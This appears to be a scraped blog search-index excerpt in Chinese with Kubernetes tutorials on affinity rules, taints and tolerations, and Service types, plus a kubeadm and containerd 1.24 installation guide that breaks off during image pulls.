&quot;xxx&quot;\n\nrequiredDuringSchedulingIgnoredDuringExecution\n创建Pod-Nodeaffinity-Required.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-nodeaffinity-required  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1  affinity:  #亲和性设置    nodeAffinity: #设置node亲和性      requiredDuringSchedulingIgnoredDuringExecution: # 硬限制        nodeSelectorTerms:        - matchExpressions: # 匹配env的值在[&quot;xxx&quot;,&quot;yyy&quot;]中的标签          - key: nodeenv            operator: In            values: [&quot;xxx&quot;,&quot;yyy&quot;]\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Nodeaffinity-Required.yamlpod/pod-nodeaffinity-required created# 查看Pod状态# 发现Pod的NODE一直为&lt;none&gt;[root@master yaml]# kubectl get pods pod-nodeaffinity-required -n default -o wideNAME                        READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED NODE   READINESS GATESpod-nodeaffinity-required   0/1     Pending   0          21s   &lt;none&gt;   &lt;none&gt;   &lt;none&gt;           &lt;none&gt;# 查看Pod详情# 发现提示node选择失败[root@master yaml]# kubectl describe pod pod-nodeaffinity-required -n default......Events:  Type     Reason            Age   From               Message  ----     ------            ----  ----               -------  Warning  FailedScheduling  105s  default-scheduler  0/3 nodes are available: 1 node(s) had untolerated taint &#123;node-role.kubernetes.io/master: &#125;, 3 node(s) didn&#x27;t match Pod&#x27;s node affinity/selector. preemption: 0/3 nodes are available: 3 Preemption is not helpful for scheduling.  # 删除Pod[root@master yaml]# kubectl delete -f Pod-Nodeaffinity-Required.yamlpod &quot;pod-nodeaffinity-required&quot; deleted# 修改Pod-Nodeaffinity-Required.yaml文件# 将values: [&quot;xxx&quot;,&quot;yyy&quot;]------&gt; [&quot;pro&quot;,&quot;yyy&quot;],并启动[root@master yaml]# vim Pod-Nodeaffinity-Required.yaml[root@master yaml]# kubectl create -f Pod-Nodeaffinity-Required.yamlpod/pod-nodeaffinity-required created# 查看Pod信息# 发现Pod已经成功调度到work1.host.com节点上[root@master yaml]#  kubectl get pods pod-nodeaffinity-required -n default -o wideNAME                        READY   STATUS    RESTARTS   AGE   IP              NODE             NOMINATED NODE   READINESS GATESpod-nodeaffinity-required   1/1     Running   0          79s   10.244.67.107   work1.host.com   &lt;none&gt;           &lt;none&gt;\n\nrequiredDuringSchedulingIgnoredDuringExecution\n创建Pod-Nodeaffinity-Preferred.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-nodeaffinity-preferred  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1  affinity:  #亲和性设置    nodeAffinity: #设置node亲和性      preferredDuringSchedulingIgnoredDuringExecution: # 软限制      - weight: 1        preference:          matchExpressions: # 匹配env的值在[&quot;xxx&quot;,&quot;yyy&quot;]中的标签(当前环境没有)          - key: nodeenv            operator: In            values: [&quot;xxx&quot;,&quot;yyy&quot;]\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Nodeaffinity-Preferred.yamlpod/pod-nodeaffinity-preferred created# 查看Pod状态# 发现Pod成功调度[root@master yaml]# kubectl get pod pod-nodeaffinity-preferred -n defaultNAME                         READY   STATUS    RESTARTS   AGEpod-nodeaffinity-preferred   1/1     Running   0          27s\n\nNodeAffinity规则设置的注意事项：    1 如果同时定义了nodeSelector和nodeAffinity，那么必须两个条件都得到满足，Pod才能运行在指定的Node上    2 如果nodeAffinity指定了多个nodeSelectorTerms，那么只需要其中一个能够匹配成功即可    3 如果一个nodeSelectorTerms中有多个matchExpressions ，则一个节点必须满足所有的才能匹配成功    4 如果一个pod所在的Node在Pod运行期间其标签发生了改变，不再符合该Pod的节点亲和性需求，则系统将忽略此变化\n\nPodAffinityPodAffinity主要实现以运行的Pod为参照，实现让新创建的Pod跟参照pod在一个区域的功能。PodAffinity的可配置项如下\npod.spec.affinity.podAffinity  requiredDuringSchedulingIgnoredDuringExecution  硬限制    namespaces       指定参照pod的namespace    topologyKey      指定调度作用域    labelSelector    标签选择器      matchExpressions  按节点标签列出的节点选择器要求列表(推荐)        key    键        values 值        operator 关系符 支持In, NotIn, Exists, DoesNotExist.      matchLabels    指多个matchExpressions映射的内容  preferredDuringSchedulingIgnoredDuringExecution 软限制    podAffinityTerm  选项      namespaces            topologyKey      labelSelector        matchExpressions            key    键          values 值          operator        matchLabels     weight 倾向权重，在范围1-100\n\ntopologyKey用于指定调度时作用域,例如:    如果指定为kubernetes.io/hostname，那就是以Node节点为区分范围\t如果指定为beta.kubernetes.io/os,则以Node节点的操作系统类型来区分\n\nrequiredDuringSchedulingIgnoredDuringExecution\n创建一个参照Pod的清单Pod-Podaffinity-Target.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-podaffinity-target  namespace: default  labels:    podenv: pro #设置标签spec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1  nodeName: work1.host.com # 将目标pod名确指定到work1.host.com上\n\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Podaffinity-Target.yamlpod/pod-podaffinity-target created# 查看Pod状态和调度节点[root@master yaml]# kubectl get pods  pod-podaffinity-target -n default -o wideNAME                     READY   STATUS    RESTARTS   AGE   IP              NODE             NOMINATED NODE   READINESS GATESpod-podaffinity-target   1/1     Running   0          19m   10.244.67.108   work1.host.com   &lt;none&gt;           &lt;none&gt;\n\n创建Pod-Podaffinity-Required.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-podaffinity-required  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1  affinity:  #亲和性设置    podAffinity: #设置pod亲和性      requiredDuringSchedulingIgnoredDuringExecution: # 硬限制      - labelSelector:          matchExpressions: # 匹配env的值在[&quot;xxx&quot;,&quot;yyy&quot;]中的标签          - key: podenv            operator: In            values: [&quot;xxx&quot;,&quot;yyy&quot;]        topologyKey: kubernetes.io/hostname\n\n上面的配置为匹配标签podenv&#x3D;xxx或者podenv&#x3D;yyy的容器的同一节点，现在还没有这样的Pod，下面运行测试一下\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Podaffinity-Required.yamlpod/pod-podaffinity-required created# 查看Pod状态# 发现创建失败[root@master yaml]# kubectl get pods pod-podaffinity-required -n defaultNAME                       READY   STATUS    RESTARTS   AGEpod-podaffinity-required   0/1     Pending   0          41s# 查看Pod详情# 发现NODE节点调度失败[root@master yaml]# kubectl describe pods pod-podaffinity-required  -n default......Events:  Type     Reason            Age   From               Message  ----     ------            ----  ----               -------  Warning  FailedScheduling  85s   default-scheduler  0/3 nodes are available: 1 node(s) had untolerated taint &#123;node-role.kubernetes.io/master: &#125;, 3 node(s) didn&#x27;t match pod affinity rules. preemption: 0/3 nodes are available: 3 Preemption is not helpful for scheduling.  # 删除Pod[root@master yaml]# kubectl delete -f Pod-Podaffinity-Required.yamlpod &quot;pod-podaffinity-required&quot; deleted# 修改Pod-Podaffinity-Required.yaml的values: [&quot;xxx&quot;,&quot;yyy&quot;]为values:[&quot;pro&quot;,&quot;yyy&quot;]# 再次创建Pod[root@master yaml]# vim Pod-Podaffinity-Required.yaml[root@master yaml]# kubectl create -f Pod-Podaffinity-Required.yamlpod/pod-podaffinity-required created# 再次查看Pod状态# 发现Pod已经成调度到参照Pod的节点[root@master yaml]# kubectl get pods pod-podaffinity-required -n default -o wideNAME                       READY   STATUS    RESTARTS   AGE   IP              NODE             NOMINATED NODE   READINESS GATESpod-podaffinity-required   1/1     Running   0          61s   10.244.67.109   work1.host.com   &lt;none&gt;           &lt;none&gt;\n\nPodAffinity的 preferredDuringSchedulingIgnoredDuringExecution，不再演示。\nPodAntiAffinityPodAntiAffinity主要实现以运行的Pod为参照，让新创建的Pod跟参照pod不在一个区域中的功能。PodAntiAffinty的配置方式适合PodAffinty是一样的，测试方法如下\n# 继续使用PodAffinity的Pod为参照Pod[root@master yaml]# kubectl get pods -n default -o wide --show-labelsNAME                         READY   STATUS             RESTARTS          AGE     IP              NODE             NOMINATED NODE   READINESS GATES   LABELSpod-podaffinity-target       1/1     Running            0                 28m     10.244.67.108   work1.host.com   &lt;none&gt;           &lt;none&gt;            podenv=pro\n\n创建Pod-Podantiaffinity-Required.yaml，内容如下\napiVersion: v1kind: Podmetadata:  name: pod-podantiaffinity-required  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1  affinity:  #亲和性设置    podAntiAffinity: #设置pod亲和性      requiredDuringSchedulingIgnoredDuringExecution: # 硬限制      - labelSelector:          matchExpressions: # 匹配podenv的值在[&quot;pro&quot;]中的标签          - key: podenv            operator: In            values: [&quot;pro&quot;]        topologyKey: kubernetes.io/hostname\n\n上面配置为新Pod必须要与拥有标签nodeenv&#x3D;pro的pod不在同一Node上，运行测试一下\n# 创建Pod[root@master yaml]# kubectl create -f Pod-Podantiaffinity-Required.yamlpod/pod-podantiaffinity-required created# 查看Pod状态# 发现Pod调度到了work2.host.com节点[root@master yaml]# kubectl get pods pod-podantiaffinity-required -n default -o wideNAME                           READY   STATUS    RESTARTS   AGE     IP              NODE             NOMINATED NODE   READINESS GATESpod-podantiaffinity-required   1/1     Running   0          2m13s   10.244.52.230   work2.host.com   &lt;none&gt;           &lt;none&gt;\n\n污点和容忍污点（Taints）前面的调度方式都是站在Pod的角度上，通过在Pod上添加属性，来确定Pod是否要调度到指定的Node上，其实我们也可以站在Node的角度上，通过在Node上添加污点属性，来决定是否允许Pod调度过来。Node被设置上污点之后就和Pod之间存在了一种相斥的关系，进而拒绝Pod调度进来，甚至可以将已经存在的Pod驱逐出去。\n污点的格式为：key=value:effect, key和value是污点的标签，effect描述污点的作用，支持如下三个选项：\n\nPreferNoSchedule：kubernetes将尽量避免把Pod调度到具有该污点的Node上，除非没有其他节点可调度\nNoSchedule：kubernetes将不会把Pod调度到具有该污点的Node上，但不会影响当前Node上已存在的Pod\nNoExecute：kubernetes将不会把Pod调度到具有该污点的Node上，同时也会将Node上已存在的Pod驱离\n\n\n# 设置污点kubectl taint nodes &lt;节点&gt; key=value:effect# 去除污点kubectl taint nodes &lt;节点&gt; key:effect-# 去除所有污点kubectl taint nodes &lt;节点&gt; key-# 查看污点kubectl describe node &lt;节点&gt;......Taints:             &lt;none&gt;......\n\n已NoSchedule为例，创建Pod-Taints-Noschedule.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-taints-noschedule  namespace: default  labels:    app: podspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1\n\n\n\n# 为work1.host.com创建污点[root@master yaml]# kubectl taint nodes work1.host.com region=qingdao:NoSchedulenode/work1.host.com tainted# 为work2.host.com创建污点[root@master yaml]# kubectl taint nodes work2.host.com region=beijing:NoSchedulenode/work2.host.com tainted# 创建Pod[root@master yaml]# kubectl create -f Pod-Taints-Noschedule.yamlpod/pod-taints-noschedule created# 查看Pod状态# 发现Pod未被调度到节点上面[root@master yaml]# kubectl get pod -n default pod-taints-noschedule -o wideNAME                    READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED NODE   READINESS GATESpod-taints-noschedule   0/1     Pending   0          38s   &lt;none&gt;   &lt;none&gt;   &lt;none&gt;           &lt;none&gt;# 查看Pod详情# 发现集群3台NODE都有污点不能调度[root@master yaml]# kubectl describe pod -n default pod-taints-noscheduleEvents:  Type     Reason            Age   From               Message  ----     ------            ----  ----               -------  Warning  FailedScheduling  108s  default-scheduler  0/3 nodes are available: 1 node(s) had untolerated taint &#123;node-role.kubernetes.io/master: &#125;, 1 node(s) had untolerated taint &#123;region: beijing&#125;, 1 node(s) had untolerated taint &#123;region: qingdao&#125;. preemption: 0/3 nodes are available: 3 Preemption is not helpful for scheduling.\n\n\n\n容忍（Toleration）污点就是拒绝，容忍就是忽略，Node通过污点拒绝pod调度上去，Pod通过容忍忽略拒绝。\n\n配置模板\n[root@master yaml]# kubectl explain pod.spec.tolerations......FIELDS:   key       # 对应着要容忍的污点的键，空意味着匹配所有的键   value     # 对应着要容忍的污点的值   operator  # key-value的运算符，支持Equal和Exists（默认）   effect    # 对应污点的effect，空意味着匹配所有影响   tolerationSeconds   # 容忍时间, 当effect为NoExecute时生效，表示pod在Node上的停留时间\n\n创建Pod-Toleration.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pod-toleration  namespace: default  labels:    app: podspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1  tolerations:      \t\t# 添加容忍  - key: &quot;region&quot;        \t# 要容忍的污点的key    operator: &quot;Equal&quot;  \t# 操作符equal等于    value: &quot;beijing&quot;   \t# 容忍的污点的value    effect: &quot;NoSchedule&quot;  # 添加容忍的规则，这里必须和标记的污点规则相同\n\n# 创建Pod[root@master yaml]# kubectl create -f  Pod-Toleration.yamlpod/pod-toleration created# 查看Pod状态# 发现成功调度到work2.host.com节点[root@master yaml]# kubectl get pod pod-toleration -n default -o wideNAME             READY   STATUS    RESTARTS   AGE   IP              NODE             NOMINATED NODE   READINESS GATESpod-toleration   1/1     Running   0          6s    10.244.52.232   work2.host.com   &lt;none&gt;           &lt;none&gt;\n\n","categories":["容器编排"],"tags":["开源工具","Kubernetes","Pod"]},{"title":"Kubernetes-Service详解","url":"/2022/09/05/Kubernetes-Service%E8%AF%A6%E8%A7%A3/","content":"Service概述在kubernetes中，pod是应用程序的载体，可以通过pod的ip来访问应用程序，但是pod的ip地址不是固定的，这也就意味着不方便直接采用pod的ip对服务进行访问。为了解决这个问题，kubernetes提供了Service资源，Service会对提供同一个服务的多个pod进行聚合，并且提供一个统一的入口地址。通过访问Service的入口地址就能访问到后面的pod服务。\n\nService在很多情况下只是一个概念，真正起作用的其实是kube-proxy服务进程，每个Node节点上都运行着一个kube-proxy服务进程。当创建Service的时候会通过api-server向etcd写入创建的service的信息，而kube-proxy会基于监听的机制发现这种Service的变动，然后它会将最新的Service信息转换成对应的访问规则。\n\n工作模式userspace 模式userspace模式下，kube-proxy会为每一个Service创建一个监听端口，发向Cluster IP的请求被Iptables规则重定向到kube-proxy监听的端口上，kube-proxy根据LB算法选择一个提供服务的Pod并和其建立链接，以将请求转发到Pod上。该模式下，kube-proxy充当了一个四层负责均衡器的角色。由于kube-proxy运行在userspace中，在进行转发处理时会增加内核和用户空间之间的数据拷贝，虽然比较稳定，但是效率比较低。\n\niptables模式iptables模式下，kube-proxy为service后端的每个Pod创建对应的iptables规则，直接将发向Cluster IP的请求重定向到一个Pod IP。该模式下kube-proxy不承担四层负责均衡器的角色，只负责创建iptables规则。该模式的优点是较userspace模式效率更高，但不能提供灵活的LB策略，当后端Pod不可用时也无法进行重试。\n\nipvs模式ipvs模式和iptables类似，kube-proxy监控Pod的变化并创建相应的ipvs规则。ipvs相对iptables转发效率更高。除此以外，ipvs支持更多的LB算法。\n\n设置工作模式# 以ipvs为例，使用之前请安装ipvs模块(安装集群时已经安装)# 编辑kube-proxy cm修改mode为&quot;ipvs&quot;[root@master yaml]# kubectl edit cm kube-proxy -n kube-systemconfigmap/kube-proxy edited......    mode: &quot;ipvs&quot;......# 删除kube-proxy使其自动重启更新配置[root@master yaml]# kubectl delete pod -l k8s-app=kube-proxy -n kube-systempod &quot;kube-proxy-5r4xw&quot; deletedpod &quot;kube-proxy-qww6b&quot; deletedpod &quot;kube-proxy-th7hm&quot; deleted# 查看ipvs规则# 发现配置已生效[root@master yaml]# ipvsadm -LnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags  -&gt; RemoteAddress:Port           Forward Weight ActiveConn InActConnTCP  10.96.0.1:443 rr  -&gt; 192.16.1.10:6443             Masq    1      0          0TCP  10.96.0.10:53 rr  -&gt; 10.244.52.213:53             Masq    1      0          0  -&gt; 10.244.52.218:53             Masq    1      0          0TCP  10.96.0.10:9153 rr  -&gt; 10.244.52.213:9153           Masq    1      0          0  -&gt; 10.244.52.218:9153           Masq    1      0          0UDP  10.96.0.10:53 rr  -&gt; 10.244.52.213:53             Masq    1      0          0  -&gt; 10.244.52.218:53             Masq    1      0          0\n\nService资源清单kind: Service  # 资源类型apiVersion: v1  # 资源版本metadata: # 元数据  name: service # 资源名称  namespace: &lt;命名空间&gt;spec: # 描述  selector: # 标签选择器，用于确定当前service代理哪些pod  type: &lt;Service类型&gt;  clusterIP: &lt;虚拟服务的ip地址&gt;  sessionAffinity: # session亲和性，支持ClientIP、None两个选项  ports: # 端口信息    - protocol: &lt;协议&gt;       port: &lt;service端口&gt;      targetPort: &lt;pod端口&gt;      nodePort: &lt;主机端口&gt;\n\nService类型如下:\n\nClusterIP：默认值，它是Kubernetes系统自动分配的虚拟IP，只能在集群内部访问\nNodePort：将Service通过指定的Node上的端口暴露给外部，通过此方法，就可以在集群外部访问服务\nLoadBalancer：使用外接负载均衡器完成到服务的负载分发，注意此模式需要外部云环境支持\nExternalName： 把集群外部的服务引入集群内部，直接使用\n\nService使用实验环境在使用service之前，首先利用Deployment创建出3个pod，注意要为pod设置app=nginx-pod的标签。\n创建Service-Env.yaml，内容如下\napiVersion: apps/v1kind: Deployment      metadata:  name: service-env  namespace: defaultspec:   replicas: 3  selector:    matchLabels:      app: service-env  template:    metadata:      labels:        app: service-env    spec:      containers:      - name: nginx        image: docker.io/library/nginx:1.23.1        ports:        - containerPort: 80\n\n# 创建deploy[root@master yaml]# kubectl create -f Service-Env.yamldeployment.apps/service-env created# 查看pod详情[root@master yaml]# kubectl get pods -n default -o wide --show-labelsNAME                             READY   STATUS             RESTARTS          AGE     IP              NODE             NOMINATED NODE   READINESS GATES   LABELSservice-env-77bd9f74d4-7qntr     1/1     Running            0                 108s    10.244.52.222   work2.host.com   &lt;none&gt;           &lt;none&gt;service-env-77bd9f74d4-9hs5k     1/1     Running            0                 108s    10.244.67.84    work1.host.com   &lt;none&gt;           &lt;none&gt;service-env-77bd9f74d4-s5hh5     1/1     Running            0                 108s    10.244.67.79    work1.host.com   &lt;none&gt;           &lt;none&gt;# 为了方便测试修改nginx的访问页面为podip# 给容器依次修改[root@master yaml]# kubectl exec -it service-env-77bd9f74d4-7qntr -n default /bin/shkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.# echo 10.244.52.222 &gt; /usr/share/nginx/html/index.html# exit[root@master yaml]# kubectl exec -it service-env-77bd9f74d4-9hs5k -n default /bin/shkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.# echo 10.244.67.84 &gt; /usr/share/nginx/html/index.html# exit[root@master yaml]# kubectl exec -it service-env-77bd9f74d4-s5hh5 -n default /bin/shkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.# echo 10.244.67.79 &gt; /usr/share/nginx/html/index.html# exit# 访问测试[root@master yaml]# curl 10.244.52.22210.244.52.222[root@master yaml]# curl 10.244.67.8410.244.67.84[root@master yaml]# curl 10.244.67.7910.244.67.79\n\nClusterIP创建Service-Clusterip.yaml，内容如下\napiVersion: v1kind: Servicemetadata:  name: service-clusterip  namespace: defaultspec:  selector:    app: service-env  clusterIP: 10.97.1.1 # service的ip地址，如果不写，默认会生成一个  type: ClusterIP  ports:  - port: 80  # Service端口           targetPort: 80 # pod端口\n\n# 创建service[root@master yaml]# kubectl create -f Service-Clusterip.yamlservice/service-clusterip created# 查看service[root@master yaml]# kubectl get svc -n default -o wideNAME                TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE     SELECTORkubernetes          ClusterIP   10.96.0.1    &lt;none&gt;        443/TCP   2d18h   &lt;none&gt;service-clusterip   ClusterIP   10.97.1.1    &lt;none&gt;        80/TCP    4m42s   app=service-env# 查看service详情# 里面有一个Endpoints,里面就是pod入口[root@master yaml]# kubectl describe svc service-clusterip -n defaultName:              service-clusteripNamespace:         defaultLabels:            &lt;none&gt;Annotations:       &lt;none&gt;Selector:          app=service-envType:              ClusterIPIP Family Policy:  SingleStackIP Families:       IPv4IP:                10.97.1.1IPs:               10.97.1.1Port:              &lt;unset&gt;  80/TCPTargetPort:        80/TCPEndpoints:         10.244.52.222:80,10.244.67.79:80,10.244.67.84:80Session Affinity:  NoneEvents:            &lt;none&gt;# 查看ipvs的映射规则[root@master yaml]# ipvsadm -Ln......TCP  10.97.1.1:80 rr  -&gt; 10.244.52.222:80             Masq    1      0          0  -&gt; 10.244.67.79:80              Masq    1      0          0  -&gt; 10.244.67.84:80              Masq    1      0          0......# 访问测试# http://10.97.1.1:80[root@master yaml]# curl http://10.97.1.1:8010.244.67.84[root@master yaml]# curl http://10.97.1.1:8010.244.67.79[root@master yaml]# curl http://10.97.1.1:8010.244.52.222\n\nHeadLinessEndpoint是kubernetes中的一个资源对象，存储在etcd中，用来记录一个service对应的所有pod的访问地址，它是根据service配置文件中selector描述产生的。一个Service由一组Pod组成，这些Pod通过Endpoints暴露出来，Endpoints是实现实际服务的端点集合。换句话说，service和pod之间的联系是通过endpoints实现的。\n创建Service-Headliness.yaml，内容如下\napiVersion: v1kind: Servicemetadata:  name: service-headliness  namespace: defaultspec:  selector:    app: service-env  clusterIP: None # 将clusterIP设置为None，即可创建headliness Service  type: ClusterIP  ports:  - port: 80        targetPort: 80\n\n# 创建service[root@master yaml]# kubectl create -f Service-Headliness.yamlservice/service-headliness created# 查看service# 发现CLUSTER-IP未分配IP[root@master yaml]# kubectl get svc service-headliness -n default -o wideNAME                 TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE   SELECTORservice-headliness   ClusterIP   None         &lt;none&gt;        80/TCP    43s   app=service-env# 查看service详情[root@master yaml]# kubectl describe svc service-headliness  -n defaultName:              service-headlinessNamespace:         defaultLabels:            &lt;none&gt;Annotations:       &lt;none&gt;Selector:          app=service-envType:              ClusterIPIP Family Policy:  SingleStackIP Families:       IPv4IP:                NoneIPs:               NonePort:              &lt;unset&gt;  80/TCPTargetPort:        80/TCPEndpoints:         10.244.52.222:80,10.244.67.79:80,10.244.67.84:80Session Affinity:  NoneEvents:            &lt;none&gt;# 查看域名的解析情况[root@master yaml]# kubectl exec -it pc-deployment-6895856946-9b24j -n default /bin/shkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.# cat /etc/resolv.confsearch default.svc.cluster.local svc.cluster.local cluster.local host.comnameserver 10.96.0.10options ndots:5# exit# 查看域名解析记录[root@master yaml]# dig @10.96.0.10 service-headliness.default.svc.cluster.local +short10.244.67.8410.244.52.22210.244.67.79\n\nNodePort如果希望将Service暴露给集群外部使用，那么就要使用到另外一种类型的Service，称为NodePort类型。NodePort的工作原理其实就是将service的端口映射到Node的一个端口上，然后就可以通过NodeIp:NodePort来访问service了。\n\n创建Service-Nodeport.yaml,内容如下\napiVersion: v1kind: Servicemetadata:  name: service-nodeport  namespace: defaultspec:  selector:    app: service-env  type: NodePort # service类型  ports:  - port: 80    nodePort: 30002 # 指定绑定的node的端口(默认的取值范围是：30000-32767), 如果不指定，会默认分配    targetPort: 80\n\n# 创建service[root@master yaml]# kubectl create -f  Service-Nodeport.yamlservice/service-nodeport created# 查看service[root@master yaml]# kubectl get svc -n default -o wideNAME                 TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE     SELECTORservice-nodeport     NodePort    10.101.89.79   &lt;none&gt;        80:30002/TCP   20s     app=service-env# 访问测试# 访问每个节点的30002端口[root@master yaml]# curl http://master.host.com:3000210.244.67.84[root@master yaml]# curl http://work1.host.com:3000210.244.67.79[root@master yaml]# curl http://work2.host.com:3000210.244.67.84\n\nLoadBalancerLoadBalancer和NodePort很相似，目的都是向外部暴露一个端口，区别在于LoadBalancer会在集群的外部再来做一个负载均衡设备，而这个设备需要外部环境支持的，外部服务发送到这个设备上的请求，会被设备负载之后转发到集群中。实现LoadBalancer需要外部设备，这里不做演示。\n\nExternalNameExternalName类型的Service用于引入集群外部的服务，它通过externalName属性指定外部一个服务的地址，然后在集群内部访问此service就可以访问到外部的服务了。\n\n创建Service-Externalname.yaml，内容如下\napiVersion: v1kind: Servicemetadata:  name: service-externalname  namespace: defaultspec:  type: ExternalName # service类型  externalName: www.baidu.com  #改成ip地址也可以\n\n# 创建service[root@master yaml]# kubectl create -f Service-Externalname.yamlservice/service-externalname created# 查看域名解析记录[root@master yaml]# dig @10.96.0.10 service-externalname.default.svc.cluster.local +shortwww.baidu.com.39.156.66.1439.156.66.18\n\n注意service域名解析记录的域名组成如下\n[资源名称].[命名空间].svc.cluster.local","categories":["容器编排"],"tags":["开源工具","Kubernetes","Service"]},{"title":"Kubernetes-安装-Kubeadm-Containerd-1.24.0","url":"/2022/07/31/Kubernetes-%E5%AE%89%E8%A3%85-Kubeadm-Containerd-1.24.0/","content":"准备开始\n一台兼容的 Linux 主机。Kubernetes 项目为基于 Debian 和 Red Hat 的 Linux 发行版以及一些不提供包管理器的发行版提供通用的指令\n每台机器 2 GB 或更多的 RAM （如果少于这个数字将会影响你应用的运行内存）\n2 CPU 核或更多\n集群中的所有机器的网络彼此均能相互连接(公网和内网都可以)\n节点之中不可以有重复的主机名、MAC 地址或 product_uuid。请参见这里了解更多详细信息。\n开启机器上的某些端口。请参见这里 了解更多详细信息。\n禁用交换分区。为了保证 kubelet 正常工作，你 必须 禁用交换分区。\n\n环境\n\n\n主机名\n系统\n硬件\n环境\n\n\n\nmaster.host.com\nrocky8.5\n2核CPU，2G内存\n关闭selinux和防火墙，可使用主机名通信\n\n\nwork1.host.com\nrocky8.5\n2核CPU，2G内存\n关闭selinux和防火墙，可使用主机名通信\n\n\nwork2.host.com\nrocky8.5\n2核CPU，2G内存\n关闭selinux和防火墙，可使用主机名通信\n\n\n初始化主机\n一下操作所有主机都做\n\n安装配置Containerdcurl -o /etc/yum.repos.d/docker.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum -y install containerd.iocontainerd config default | sudo tee /etc/containerd/config.tomlsed -i &#x27;s/SystemdCgroup = false/SystemdCgroup = true/g&#x27; /etc/containerd/config.tomlsystemctl enable --now containerd\n关闭SWAP分区sudo swapoff -asudo sed -ri &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab\n允许 iptables 检查桥接流量并配置内核转发modprobe  br_netfiltercat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.confbr_netfilterEOFcat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1net.ipv4.ip_forward = 1EOFsudo sysctl --system\n配置IPVS\nservice有基于iptables和基于ipvs两种代理模型。基于ipvs的性能要高一些。需要手动载入才能使用ipvs模块\n\nyum install -y ipset ipvsadmcat &gt; /etc/sysconfig/modules/ipvs.modules &lt;&lt;EOF#!/bin/bashmodprobe -- ip_vsmodprobe -- ip_vs_rrmodprobe -- ip_vs_wrrmodprobe -- ip_vs_shmodprobe -- nf_conntrack_ipv4EOFchmod +x /etc/sysconfig/modules/ipvs.modules/bin/bash /etc/sysconfig/modules/ipvs.modules\n\n如果出现以下报错则执行下面内容modprobe: FATAL: Module nf_conntrack_ipv4 not found in directory /lib/modules/4.18.0-348.el8.0.2.x86_64\n\nsed -i &#x27;s/nf_conntrack_ipv4/nf_conntrack/g&#x27; /etc/sysconfig/modules/ipvs.modules/bin/bash /etc/sysconfig/modules/ipvs.modules\n安装Kubernetes相关软件工具cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=1repo_gpgcheck=1gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOFyum install -y kubelet-1.24.0 kubeadm-1.24.0 kubectl-1.24.0systemctl enable --now kubelet\n安装KubernetesMASTER节点生成kubeadm配置文件:sudo kubeadm config print init-defaults &gt; kubeadm.yaml编辑kubeadm.yaml并修改下面内容\nadvertiseAddress: 改成自己的ipnodeRegistration下的name字段:改成自己的主机名imageRepository: registry.aliyuncs.com/google_containers\n在networking段添加pod的网段:podSubnet: 10.244.0.0/16修改后内容如下:\n$ cat kubeadm.yamlapiVersion: kubeadm.k8s.io/v1beta3bootstrapTokens:- groups:  - system:bootstrappers:kubeadm:default-node-token  token: abcdef.0123456789abcdef  ttl: 24h0m0s  usages:  - signing  - authenticationkind: InitConfigurationlocalAPIEndpoint:  advertiseAddress: 192.168.0.109  bindPort: 6443nodeRegistration:  criSocket: unix:///var/run/containerd/containerd.sock  imagePullPolicy: IfNotPresent  name: master.host.com  taints: null---apiServer:  timeoutForControlPlane: 4m0sapiVersion: kubeadm.k8s.io/v1beta3certificatesDir: /etc/kubernetes/pkiclusterName: kubernetescontrollerManager: &#123;&#125;dns: &#123;&#125;etcd:  local:    dataDir: /var/lib/etcdimageRepository: registry.aliyuncs.com/google_containerskind: ClusterConfigurationkubernetesVersion: 1.24.0networking:  dnsDomain: cluster.local  serviceSubnet: 10.96.0.0/12  podSubnet: 10.244.0.0/16scheduler: &#123;&#125;\n下载Kubernetes所需镜像:\n$ kubeadm config --config kubeadm.yaml images pull[config/images] Pulled registry.aliyuncs.com/google_containers/kube-apiserver:v1.24.0[config/images] Pulled registry.aliyuncs.com/google_containers/kube-controller-manager:v1.24.0[config/images] Pulled registry.aliyuncs.com/google_containers/kube-scheduler:v1.24.0[config/images] Pulled registry.aliyuncs.com/google_containers/kube-proxy:v1.24.0[config/images] Pulled registry.aliyuncs.com/google_containers/pause:3.7[config/images] Pulled registry.aliyuncs.com/google_containers/etcd:3.5.3-0[config/images] Pulled 